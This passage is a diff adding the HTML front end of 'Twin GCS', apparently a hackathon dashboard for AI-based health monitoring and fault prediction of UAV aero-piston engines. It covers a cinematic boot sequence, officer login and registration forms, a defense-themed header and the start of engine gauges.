@@ -1,0 +1,1908 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+    <title>Twin GCS | AI-Enabled Real-Time Digital Twin System for MALE UAV Engines (Aero-Piston)</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Orbitron:wght@600;700;800;900&family=Outfit:wght@400;500;600;700&family=Rajdhani:wght@600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/intro_login.css">
+    <link rel="stylesheet" href="css/sih_innovations.css">
+    <!-- Three.js & OrbitControls for 360° Interactive CAD & Exploded Assembly Mode -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/three@0.128.0/examples/js/controls/OrbitControls.js"></script>
+</head>
+<body>
+
+    <!-- ====================================================================
+         0A. 4-STAGE CINEMATIC STARTUP & SYSTEM INITIALIZATION OVERLAY
+         (Matches User Reference Storyboard Panels 1, 2, 3, and 4)
+         ==================================================================== -->
+    <div class="cinematic-boot-overlay" id="cinematicBootOverlay">
+        <canvas id="bootStarfieldCanvas"></canvas>
+
+        <!-- Top Interactive Stage Selector & Skip Bar -->
+        <div class="boot-top-hud">
+            <div style="display:flex; align-items:center; gap:10px; font-family:'Orbitron',sans-serif; font-size:12px; color:#00f0ff; letter-spacing:2px;">
+                <span>⚡ CODECREW // TWIN GCS SYSTEM INITIALIZATION</span>
+            </div>
+
+            <div class="boot-stage-pills">
+                <span class="boot-stage-pill active" id="bootStagePill1" onclick="jumpToBootStage(1)">01 • CODECREW HORIZON</span>
+                <span class="boot-stage-pill" id="bootStagePill2" onclick="jumpToBootStage(2)">02 • LOADING MODULES</span>
+                <span class="boot-stage-pill" id="bootStagePill3" onclick="jumpToBootStage(3)">03 • TWIN GCS HANGAR</span>
+                <span class="boot-stage-pill" id="bootStagePill4" onclick="jumpToBootStage(4)">04 • ENGINE DIGITAL TWIN</span>
+            </div>
+
+            <div style="display:flex; align-items:center; gap:10px;">
+                <button class="boot-skip-btn" id="bootPauseBtn" onclick="toggleBootPause()">⏸ PAUSE STAGE</button>
+                <button class="boot-skip-btn" onclick="transitionBootToLogin()">SKIP TO LOGIN ⏭</button>
+            </div>
+        </div>
+
+        <!-- 4 Fullscreen Stage Slides -->
+        <div class="boot-stages-viewport">
+
+            <!-- PANEL 1 (0% - 26%): CODECREW ORBITAL SUNRISE -->
+            <div class="boot-stage-slide active" id="bootStageSlide1">
+                <div class="stage1-bg"></div>
+                <div class="stage1-horizon-flare"></div>
+
+                <div class="codecrew-hero-center">
+                    <!-- Glowing Cyan Delta 'A' Emblem -->
+                    <svg class="codecrew-delta-svg" viewBox="0 0 120 110" fill="none">
+                        <defs>
+                            <linearGradient id="ccDeltaGrad" x1="0" y1="0" x2="120" y2="110" gradientUnits="userSpaceOnUse">
+                                <stop offset="0%" stop-color="#7df9ff"/>
+                                <stop offset="50%" stop-color="#00d4ff"/>
+                                <stop offset="100%" stop-color="#0052d4"/>
+                            </linearGradient>
+                        </defs>
+                        <path d="M60 8 L112 96 L88 96 L60 46 L32 96 L8 96 Z" fill="url(#ccDeltaGrad)"/>
+                        <path d="M60 32 L92 88 L42 88 L50 74 L70 74 L60 56 Z" fill="#00f0ff"/>
+                        <polygon points="60,62 72,84 48,84" fill="#020818"/>
+                    </svg>
+
+                    <div class="codecrew-main-title">CODECREW</div>
+                    <div class="codecrew-subtitle">INNOVATING BEYOND BOUNDARIES</div>
+
+                    <div class="codecrew-pillars-row">
+                        <span>IDEA</span><span class="sep">|</span>
+                        <span>INNOVATION</span><span class="sep">|</span>
+                        <span>TECHNOLOGY</span><span class="sep">|</span>
+                        <span>IMPACT</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PANEL 2 (26% - 64%): LOADING MODULES & 3D HOLOGRAPHIC BLUEPRINTS -->
+            <div class="boot-stage-slide" id="bootStageSlide2">
+                <div class="stage2-split-container">
+                    <!-- Left: 7 Sequential Modules Checklist -->
+                    <div class="loading-modules-panel">
+                        <div class="loading-modules-heading">LOADING MODULES</div>
+                        <div class="module-check-list">
+                            <div class="module-check-row done" id="bootModRow0">
+                                <div class="mod-left"><span class="mod-icon-box">✈️</span><span>UAV Systems</span></div>
+                                <div class="mod-status-ind" id="bootModInd0">✔</div>
+                            </div>
+                            <div class="module-check-row done" id="bootModRow1">
+                                <div class="mod-left"><span class="mod-icon-box">⚙️</span><span>Engine Digital Twin</span></div>
+                                <div class="mod-status-ind" id="bootModInd1">✔</div>
+                            </div>
+                            <div class="module-check-row done" id="bootModRow2">
+                                <div class="mod-left"><span class="mod-icon-box">📡</span><span>Sensor Integration</span></div>
+                                <div class="mod-status-ind" id="bootModInd2">✔</div>
+                            </div>
+                            <div class="module-check-row active-loading" id="bootModRow3">
+                                <div class="mod-left"><span class="mod-icon-box">🧠</span><span>AI Fault Prediction</span></div>
+                                <div class="mod-status-ind" id="bootModInd3"></div>
+                            </div>
+                            <div class="module-check-row" id="bootModRow4">
+                                <div class="mod-left"><span class="mod-icon-box">📈</span><span>Live Telemetry</span></div>
+                                <div class="mod-status-ind" id="bootModInd4"></div>
+                            </div>
+                            <div class="module-check-row" id="bootModRow5">
+                                <div class="mod-left"><span class="mod-icon-box">🧭</span><span>Mission Analytics</span></div>
+                                <div class="mod-status-ind" id="bootModInd5"></div>
+                            </div>
+                            <div class="module-check-row" id="bootModRow6">
+                                <div class="mod-left"><span class="mod-icon-box">🛡️</span><span>Security Protocols</span></div>
+                                <div class="mod-status-ind" id="bootModInd6"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Right: Holographic Wireframe UAV + Holographic Engine -->
+                    <div class="stage2-holograms-col">
+                        <div class="holo-blueprint-card">
+                            <div class="holo-scan-laser"></div>
+                            <img src="assets/uav_xray_external.jpg" alt="MALE UAV Holographic Blueprint">
+                            <span class="holo-tag-label">AIRFRAME CAD: DRDO TAPAS BH-201 MALE UAV</span>
+                        </div>
+                        <div class="holo-blueprint-card">
+                            <div class="holo-scan-laser" style="animation-delay: 1.1s;"></div>
+                            <img src="assets/engine_xray_internal.jpg" alt="Aero-Piston Engine Holographic Blueprint">
+                            <span class="holo-tag-label">PROPULSION TWIN: ROTAX 914 F TURBO 4-CYL BOXER</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PANEL 3 (64% - 84%): TWIN GCS HANGAR REVEAL -->
+            <div class="boot-stage-slide" id="bootStageSlide3">
+                <div class="stage3-bg"></div>
+                <div class="stage3-content-wrap">
+                    <div class="twingcs-hero-title">
+                        <span class="white-part">TWIN </span><span class="cyan-part">GCS</span>
+                    </div>
+                    <div class="twingcs-hero-sub1">AI-Enabled Real-Time Digital Twin System</div>
+                    <div class="twingcs-hero-sub2">for Health Monitoring and Fault Prediction of MALE UAV Engines (Aero-Piston)</div>
+
+                    <div class="powered-by-box">
+                        <span class="lbl">Powered by</span>
+                        <span class="brand">CODECREW</span>
+                        <span class="powered-chevrons">&gt;&gt;&gt;</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- PANEL 4 (84% - 100%): PHOTOREALISTIC ENGINE DIGITAL TWIN & 4 PILLARS -->
+            <div class="boot-stage-slide" id="bootStageSlide4">
+                <div class="stage4-engine-arena">
+                    <div class="stage4-hud-ring"></div>
+
+                    <!-- 4 Corner Capability Nodes matching Reference Panel 4 -->
+                    <div class="stage4-feature-node top-left">
+                        <div class="feat-node-icon">📊</div>
+                        <div class="feat-node-text">REAL-TIME<br>MONITORING</div>
+                    </div>
+
+                    <div class="stage4-feature-node top-right">
+                        <div class="feat-node-icon">🧠</div>
+                        <div class="feat-node-text">AI<br>PREDICTION</div>
+                    </div>
+
+                    <div class="stage4-feature-node bottom-left">
+                        <div class="feat-node-icon">🧊</div>
+                        <div class="feat-node-text">DIGITAL<br>TWIN</div>
+                    </div>
+
+                    <div class="stage4-feature-node bottom-right">
+                        <div class="feat-node-icon">🛡️</div>
+                        <div class="feat-node-text">HIGHER<br>RELIABILITY</div>
+                    </div>
+
+                    <!-- Center Photorealistic Engine + Live Intake/Exhaust Particle Stream -->
+                    <div class="stage4-engine-img-wrap">
+                        <img src="assets/engine_photorealistic_twin.jpg" alt="Photorealistic 3D Aero-Piston Engine Twin">
+                        <canvas id="stage4EngineParticleCanvas" width="650" height="360" style="position:absolute; inset:0; pointer-events:none;"></canvas>
+                    </div>
+
+                    <div class="stage4-bottom-motto">PREVENT TODAY &nbsp;|&nbsp; SAFER SKIES TOMORROW</div>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- Bottom Progress Bar (12% -> 58% -> 100%) -->
+        <div class="boot-bottom-progress-area">
+            <div class="boot-progress-row">
+                <div class="boot-progress-track">
+                    <div class="boot-progress-fill" id="bootProgressFill"></div>
+                </div>
+                <div class="boot-progress-pct" id="bootProgressPct">0%</div>
+            </div>
+            <div class="boot-status-caption" id="bootStatusCaption">INITIALIZING CODECREW SYSTEMS...</div>
+        </div>
+    </div>
+
+    <!-- ====================================================================
+         0B. CLEAN LOGIN + SIGN UP + LIVE WEBCAM FACE ID SCANNER PORTAL
+         (Starts hidden behind the 4-stage boot animation; opens at 100%)
+         ==================================================================== -->
+    <div class="tactical-login-overlay hidden-overlay" id="tacticalLoginOverlay">
+        <canvas id="loginHudCanvas"></canvas>
+
+        <!-- Login Top Bar -->
+        <div class="login-top-bar">
+            <div class="login-brand-cluster">
+                <svg width="34" height="32" viewBox="0 0 120 110" fill="none">
+                    <path d="M60 8 L112 96 L88 96 L60 46 L32 96 L8 96 Z" fill="#00d4ff"/>
+                    <path d="M60 32 L92 88 L42 88 L50 74 L70 74 L60 56 Z" fill="#7df9ff"/>
+                </svg>
+                <div>
+                    <div style="font-family:'Orbitron',sans-serif; font-size:16px; font-weight:800; letter-spacing:2px; color:#fff;">
+                        TWIN <span style="color:#00d4ff;">GCS</span> // DEFENSE ACCESS PORTAL
+                    </div>
+                    <div style="font-size:11px; color:#94a3b8;">
+                        AI-Enabled Real-Time Digital Twin System (MALE UAV Engines) • Team CODECREW
+                    </div>
+                </div>
+            </div>
+
+            <div class="login-security-badges">
+                <span class="sec-pill green">🛡️ AIR-GAPPED MILITARY ENCLAVE</span>
+                <button class="boot-skip-btn" type="button" onclick="startCinematicBootSequence()">🎬 REPLAY INTRO ANIMATION</button>
+            </div>
+        </div>
+
+        <!-- Main 2-Tab Portal: [ 🔐 LOGIN ]  [ 📝 SIGN UP (NEW ACCOUNT) ] -->
+        <div class="auth-portal-wrapper">
+
+            <!-- Top Tabs -->
+            <div class="auth-mode-tabs">
+                <button type="button" class="auth-tab-btn active" id="tabBtnLogin" onclick="switchAuthTab('login')">
+                    <span>🔐</span>
+                    <span>OFFICER LOGIN</span>
+                </button>
+                <button type="button" class="auth-tab-btn" id="tabBtnSignup" onclick="switchAuthTab('signup')">
+                    <span>📝</span>
+                    <span>NEW OFFICER REGISTRATION</span>
+                </button>
+            </div>
+
+            <div class="auth-body-grid">
+
+                                <!-- CENTERED SOVEREIGN DEFENSE AUTHENTICATION PORTAL -->
+                <div class="auth-forms-column centered-auth-column">
+
+                <!-- ========================================================
+                     PANE 1: LOGIN FORM
+                     ======================================================== -->
+                <form class="auth-form-pane" id="loginFormPane" onsubmit="handleLoginSubmit(event)">
+                    <div>
+                        <div class="auth-pane-title">
+                            <h2>Officer Military Authentication</h2>
+                            <p>Enter your authorized credentials to access the Air-Gapped GCS.</p>
+                        </div>
+
+                        <div class="clean-form-grid">
+                            <div class="clean-input-group full-width">
+                                <label>
+                                    <span>Username / Email / Service ID *</span>
+                                </label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">👤</span>
+                                    <input type="text" id="loginUsername" placeholder="Enter Username, Email or Service ID" required autocomplete="off">
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group full-width">
+                                <label style="display:flex; justify-content:space-between; align-items:center;">
+                                    <span>Military Password *</span>
+                                    <button type="button" class="auth-link-btn" style="font-size:10px; color:#00f0ff; text-decoration:underline;" onclick="openForgotPasswordPane()">Forgot Password?</button>
+                                </label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🔑</span>
+                                    <input type="password" id="loginPassword" placeholder="Enter Military Password" required autocomplete="current-password">
+                                    <button type="button" class="pwd-eye-btn" onclick="togglePasswordVisibility('loginPassword', this)">👁️</button>
+                                </div>
+                            </div>
+
+
+
+                            <!-- Defense Cryptographic Enclave Banner -->
+                            <div class="login-crypto-shield-banner">
+                                <span class="cs-icon">🛡️</span>
+                                <div class="cs-text">
+                                    <strong>AIR-GAPPED ENCLAVE SECURITY ACTIVE</strong>
+                                    <span>SOVEREIGN DEFENSE PROTOCOL • HARDENED AIR-GAPPED ACCESS</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Failed Attempt Warning & Cooldown Banner -->
+                        <div id="loginAttemptNotice" style="display:none; padding:8px 12px; border-radius:4px; font-family:var(--font-mono); font-size:11px; margin-top:8px;"></div>
+                        <!-- Status Feedback Banner -->
+                        <div class="auth-status-banner" id="authStatusBanner"></div>
+                    </div>
+
+                    <div style="margin-top:16px;">
+                        <button type="submit" class="auth-primary-btn" id="btnLoginSubmit">
+                            <span>🔐</span>
+                            <span>VERIFY CREDENTIALS &amp; ACCESS GCS</span>
+                        </button>
+
+                        <div class="auth-secondary-row" style="margin-top:10px;">
+                            <span>New Officer? <button type="button" class="auth-link-btn" onclick="switchAuthTab('signup')">Create Military Account →</button></span>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- ========================================================
+                     LEFT PANE 3: FORGOT PASSWORD (MILITARY RECOVERY)
+                     ======================================================== -->
+                <form class="auth-form-pane hidden-pane" id="forgotPasswordFormPane" onsubmit="handleForgotPasswordSubmit(event)">
+                    <div>
+                        <div class="auth-pane-title">
+                            <h2>Tactical Password Recovery</h2>
+                            <p>Verify your official identity to receive a One-Time Tactical Reset Token (OTP).</p>
+                        </div>
+
+                        <div id="forgotStep1Grid" class="clean-form-grid">
+                            <div class="clean-input-group full-width">
+                                <label><span>Registered Military Email *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">📧</span>
+                                    <input type="email" id="forgotEmail" placeholder="e.g. officer@drdo.gov.in" required>
+                                </div>
+                            </div>
+                            <div class="clean-input-group full-width">
+                                <label><span>Officer Service ID *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🎖️</span>
+                                    <input type="text" id="forgotServiceId" placeholder="e.g. IAF-DRDO-26054" required>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="forgotStep2Grid" class="clean-form-grid" style="display:none; margin-top:10px;">
+                            <div class="clean-input-group full-width">
+                                <label><span style="color:#00f0ff;">Tactical 6-Digit OTP *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🔢</span>
+                                    <input type="text" id="forgotOtp" placeholder="Enter 6-digit OTP" maxlength="6">
+                                </div>
+                            </div>
+                            <div class="clean-input-group full-width">
+                                <label><span style="color:#00e676;">New Military Password *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🔒</span>
+                                    <input type="password" id="forgotNewPwd" placeholder="Enter new password (min 8 chars, 1 uppercase, 1 symbol)">
+                                    <button type="button" class="pwd-eye-btn" onclick="togglePasswordVisibility('forgotNewPwd', this)">👁️</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin-top:16px;">
+                        <button type="submit" class="auth-primary-btn" id="btnForgotSubmit">
+                            <span>📩</span>
+                            <span>REQUEST TACTICAL RESET OTP</span>
+                        </button>
+
+                        <div class="auth-secondary-row" style="margin-top:12px;">
+                            <button type="button" class="auth-link-btn" onclick="switchAuthTab('login')">← Return to Officer Login</button>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- ========================================================
+                     LEFT PANE 2: SIGN UP FORM (NEW REGISTRATION + PIN GENERATION)
+                     ======================================================== -->
+                <form class="auth-form-pane hidden-pane" id="signupFormPane" onsubmit="handleSignupSubmit(event)">
+                    <div>
+                        <div class="auth-pane-title">
+                            <h2>New Officer Registration</h2>
+                            <p>Enter your official service credentials. A unique 2FA Security PIN and 6-digit activation code will be issued.</p>
+                        </div>
+
+                        <div class="clean-form-grid">
+                            <div class="clean-input-group">
+                                <label><span>Full Name *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">👨‍✈️</span>
+                                    <input type="text" id="signupFullName" placeholder="e.g. Capt. Aman Verma" required>
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group">
+                                <label><span>Username or Email ID *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">📧</span>
+                                    <input type="text" id="signupUsername" placeholder="e.g. aman@drdo.gov.in" required>
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group">
+                                <label><span>Mobile Number *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">📱</span>
+                                    <input type="tel" id="signupMobile" placeholder="+91 98765 43210" required>
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group">
+                                <label><span>Designation / Role *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🎖️</span>
+                                    <select id="signupRole">
+                                        <option value="Flight Commander (DRDO ADE)">Flight Commander (DRDO ADE)</option>
+                                        <option value="Propulsion Digital Twin Engineer">Propulsion Digital Twin Engineer</option>
+                                        <option value="AI & PINN Diagnostics Analyst">AI &amp; PINN Diagnostics Analyst</option>
+                                        <option value="Ground Control Station Operator">Ground Control Station Operator</option>
+                                    </select>
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group">
+                                <label><span>Create Password *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🔒</span>
+                                    <input type="password" id="signupPassword" placeholder="Min 8 chars, 1 upper, 1 special" required>
+                                    <button type="button" class="pwd-eye-btn" onclick="togglePasswordVisibility('signupPassword', this)">👁️</button>
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group">
+                                <label><span>Confirm Password *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🔒</span>
+                                    <input type="password" id="signupConfirmPassword" placeholder="Confirm Password" required>
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group full-width">
+                                <label style="display:flex; justify-content:space-between; align-items:center;">
+                                    <span>2FA Security PIN (4-Digit) *</span>
+                                    <button type="button" class="auth-link-btn" style="color:#00f0ff; font-size:10.5px; font-weight:700;" onclick="generateRandomSignupPin()">🎲 Generate PIN</button>
+                                </label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🛡️</span>
+                                    <input type="text" id="signupBadgePin" placeholder="Enter or click 'Generate PIN' (e.g. 7412)" maxlength="6" style="font-family:var(--font-mono); letter-spacing:2px;">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div style="margin-top:16px;">
+                        <button type="submit" class="auth-primary-btn green-btn">
+                            <span>✅</span>
+                            <span>COMPLETE REGISTRATION &amp; REQUEST ACTIVATION</span>
+                        </button>
+
+                        <div class="auth-secondary-row">
+                            <span>Already registered? <button type="button" class="auth-link-btn" onclick="switchAuthTab('login')">← Back to Login</button></span>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- ========================================================
+                     LEFT PANE 4: 2-STEP MILITARY ACCOUNT ACTIVATION CHALLENGE
+                     ======================================================== -->
+                <form class="auth-form-pane hidden-pane" id="verifyAccountFormPane" onsubmit="handleAccountVerificationSubmit(event)">
+                    <div>
+                        <div class="auth-pane-title">
+                            <h2>2-Step Military Account Activation</h2>
+                            <p>An activation token challenge was dispatched. Enter your 6-digit activation code to verify your defense credentials.</p>
+                        </div>
+
+                        <div class="clean-form-grid">
+                            <div class="clean-input-group full-width">
+                                <label><span>Officer Identity (Username or Email) *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">👤</span>
+                                    <input type="text" id="verifyAccountUsername" placeholder="e.g. cadet_sharma" required readonly style="background:#030c1d; color:#00f0ff;">
+                                </div>
+                            </div>
+
+                            <div class="clean-input-group full-width">
+                                <label><span style="color:#00f0ff;">6-Digit Military Activation Code *</span></label>
+                                <div class="clean-input-box">
+                                    <span class="i-icon">🛡️</span>
+                                    <input type="text" id="verifyAccountCode" placeholder="Enter 6-digit activation code" maxlength="6" required style="font-family:var(--font-mono); font-size:16px; letter-spacing:4px; text-align:center;">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div id="verifyAccountNotice" style="display:none; padding:8px 12px; border-radius:4px; font-family:var(--font-mono); font-size:11px; margin-top:8px;"></div>
+                    </div>
+
+                    <div style="margin-top:16px;">
+                        <button type="submit" class="auth-primary-btn green-btn" id="btnVerifyAccountSubmit">
+                            <span>✅</span>
+                            <span>VERIFY DEFENSE IDENTITY &amp; ACTIVATE ACCOUNT</span>
+                        </button>
+
+                        <div class="auth-secondary-row" style="margin-top:12px;">
+                            <button type="button" class="auth-link-btn" onclick="switchAuthTab('login')">← Return to Officer Login</button>
+                        </div>
+                    </div>
+                </form>
+
+                </div> <!-- end auth-forms-column -->
+            </div> <!-- end auth-body-grid -->
+        </div> <!-- end auth-portal-wrapper -->
+    </div> <!-- end tacticalLoginOverlay -->
+
+    <!-- ====================================================================
+         1. TOP HEADER NAVBAR
+         ==================================================================== -->
+    <header class="gcs-top-header">
+        <div class="header-brand-left">
+            <div class="uav-crest-box">
+                <svg class="uav-crest-svg" viewBox="0 0 120 44" fill="none">
+                    <path d="M60 14 L116 24 L116 27 L64 23 L62 36 L74 40 L74 42 L60 39 L46 42 L46 40 L58 36 L56 23 L4 27 L4 24 L60 14 Z" fill="url(#uavGrad)" stroke="#00d4ff" stroke-width="1"/>
+                    <ellipse cx="60" cy="14" rx="5" ry="7" fill="#e2e8f0" stroke="#00d4ff" stroke-width="1"/>
+                    <defs>
+                        <linearGradient id="uavGrad" x1="0" y1="0" x2="120" y2="44" gradientUnits="userSpaceOnUse">
+                            <stop offset="0%" stop-color="#38bdf8"/>
+                            <stop offset="50%" stop-color="#e2e8f0"/>
+                            <stop offset="100%" stop-color="#0284c7"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+                <div class="uav-crest-motto">SAFER SKIES<br>STRONGER INDIA</div>
+            </div>
+            <div class="brand-titles">
+                <h1 class="brand-h1">Twin <span class="gcs-cyan">GCS</span></h1>
+                <div class="brand-subtitle">
+                    AI-Enabled Real-Time Digital Twin System for Health Monitoring and Fault Prediction of <strong>MALE UAV Engines (Aero-Piston)</strong>
+                </div>
+            </div>
+        </div>
+
+        <!-- Official Defense & National Emblems -->
+        <div class="header-emblems-center">
+            <div class="defense-emblem">
+                <div class="emblem-badge-circle drdo-circle">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                        <circle cx="12" cy="12" r="9" stroke="#facc15" stroke-width="1.6"/>
+                        <path d="M12 4L14.5 9.5L20 12L14.5 14.5L12 20L9.5 14.5L4 12L9.5 9.5L12 4Z" fill="#38bdf8" stroke="#facc15" stroke-width="1"/>
+                    </svg>
+                </div>
+                <div class="emblem-labels">
+                    <span class="e-title">DRDO</span>
+                    <span class="e-sub">Defence Research &amp; Dev. Org.</span>
+                </div>
+            </div>
+
+            <div class="defense-emblem">
+                <div class="emblem-badge-circle mod-circle">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#e2e8f0">
+                        <path d="M12 2L15 7H9L12 2ZM7 9H17L16 17H8L7 9ZM6 19H18V21H6V19Z"/>
+                    </svg>
+                </div>
+                <div class="emblem-labels">
+                    <span class="e-title">Ministry of Defence</span>
+                    <span class="e-sub">Government of India</span>
+                </div>
+            </div>
+
+            <div class="defense-emblem">
+                <div class="emblem-badge-circle atmanirbhar-circle">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
+                        <path d="M3 16C7 9 13 6 21 5" stroke="#ff9933" stroke-width="2.5" stroke-linecap="round"/>
+                        <path d="M4 18C9 12 14 9 21 8" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round"/>
+                        <path d="M6 20C11 15 15 12 21 11" stroke="#138808" stroke-width="2.5" stroke-linecap="round"/>
+                    </svg>
+                </div>
+                <div class="emblem-labels">
+                    <span class="e-title">आत्मनिर्भर भारत</span>
+                    <span class="e-sub">Aatmanirbhar Bharat</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Status, Clock & Voice Co-Pilot -->
+        <div class="header-status-right">
+            <div class="clock-box">
+                <div id="headerDateTime">Mon, 08 Sep 2026 | 14:32:18 IST</div>
+                <div class="motto-quote">"Predict Today, Prevent Tomorrow"</div>
+            </div>
+            <div class="live-pill-badge">
+                <span class="pulse-dot"></span>
+                <span>LIVE</span>
+            </div>
+            <button class="btn-voice-copilot btn-sih-innovations-pill" onclick="openSihInnovationsModal()" title="Open Official SIH 2026 Presentation Hub (4 Innovations & Military Security)">
+                🌟 SIH 2026 INNOVATIONS
+            </button>
+            <button class="btn-voice-copilot" id="voiceCopilotBtn" onclick="toggleVoiceCoPilot()">
+                🎙️ VOICE: OFF
+            </button>
+            <button class="btn-voice-copilot" id="headerCommanderBadge" onclick="openLoginScreen()" title="Switch Commander / Open Avionics Login">
+                👨‍✈️ Wg. Cdr. R. Rathore
+            </button>
+            <button class="btn-voice-copilot" onclick="startCinematicBootSequence()" title="Replay 4-Stage Cinematic Intro">
+                🎬 INTRO
+            </button>
+        </div>
+    </header>
+
+    <!-- ====================================================================
+         2. MAIN WORKSPACE (LEFT SIDEBAR + DASHBOARD CONTENT)
+         ==================================================================== -->
+    <div class="gcs-workspace">
+
+        <!-- LEFT NAVIGATION SIDEBAR -->
+        <aside class="gcs-sidebar">
+            <ul class="nav-menu">
+                <li class="nav-item active" onclick="switchNavSection(this, 'dashboard')">
+                    <span class="nav-icon">🏠</span>
+                    <span>Dashboard</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'digital-twin')">
+                    <span class="nav-icon">🧬</span>
+                    <span>Digital Twin</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'engine-health')">
+                    <span class="nav-icon">⚙️</span>
+                    <span>Engine Health</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'live-telemetry')">
+                    <span class="nav-icon">📡</span>
+                    <span>Live Telemetry</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'ai-predictions')">
+                    <span class="nav-icon">🧠</span>
+                    <span>AI Predictions</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'mission-view')">
+                    <span class="nav-icon">🗺️</span>
+                    <span>Mission View</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'alerts-logs')">
+                    <span class="nav-icon">📋</span>
+                    <span>Alerts &amp; Logs</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'reports')">
+                    <span class="nav-icon">📄</span>
+                    <span>Reports</span>
+                </li>
+                <li class="nav-item" onclick="switchNavSection(this, 'settings')">
+                    <span class="nav-icon">🔧</span>
+                    <span>Settings</span>
+                </li>
+                <li class="nav-item nav-sih-item" onclick="switchNavSection(this, 'sih-innovations')">
+                    <span class="nav-icon">🛡️</span>
+                    <span style="color:#ffd54f; font-weight:700;">Innovations &amp; Defense</span>
+                </li>
+            </ul>
+
+            <!-- Bottom Left Profile Action Button (Opens Dedicated Officer Profile Workspace Page) -->
+            <div class="sidebar-bottom-action">
+                <button type="button" id="sidebarProfileBtn" class="sidebar-profile-action-btn" onclick="openOfficerProfilePage()" title="Open Officer Profile, Station Address &amp; Password Settings">
+                    <span class="p-btn-icon">👤</span>
+                    <span class="p-btn-text" id="sidebarOfficerBtnLabel">Officer Profile</span>
+                    <span class="p-btn-badge">DEFCON-1</span>
+                </button>
+            </div>
+        </aside>
+
+        <!-- MAIN BOARD -->
+        <main class="gcs-main-board">
+
+            <!-- ============================================================
+                 ROW 1: 6 QUICK AVIONICS GAUGES RIBBON
+                 ============================================================ -->
+            <section class="top-gauges-ribbon">
+                <!-- 1. Engine RPM -->
+                <div class="gauge-dial-card">
+                    <div class="radial-svg-wrap">
+                        <svg viewBox="0 0 46 46">
+                            <circle class="track" cx="23" cy="23" r="19"/>
+                            <circle class="fill" id="dialRingRPM" cx="23" cy="23" r="19" stroke="#00e676" stroke-dasharray="119.4" stroke-dashoffset="24"/>
+                        </svg>
+                        <div class="dial-center-icon" style="color:#00e676;">⏱️</div>
+                    </div>
+                    <div class="gauge-meta">
+                        <span class="gauge-name">Engine RPM</span>
+                        <span class="gauge-readout"><span id="valRPM">2,450</span> <span class="gauge-unit">RPM</span></span>
+                    </div>
+                </div>
+
+                <!-- 2. EGT (Exhaust Temp) -->
+                <div class="gauge-dial-card">
+                    <div class="radial-svg-wrap">
+                        <svg viewBox="0 0 46 46">
+                            <circle class="track" cx="23" cy="23" r="19"/>
+                            <circle class="fill" id="dialRingEGT" cx="23" cy="23" r="19" stroke="#ffb300" stroke-dasharray="119.4" stroke-dashoffset="30"/>
+                        </svg>
+                        <div class="dial-center-icon" style="color:#ffb300;">🔥</div>
+                    </div>
+                    <div class="gauge-meta">
+                        <span class="gauge-name">EGT (Exhaust Temp)</span>
+                        <span class="gauge-readout"><span id="valEGT">685</span> <span class="gauge-unit">°C</span></span>
+                    </div>
+                </div>
+
+                <!-- 3. Oil Pressure -->
+                <div class="gauge-dial-card">
+                    <div class="radial-svg-wrap">
+                        <svg viewBox="0 0 46 46">
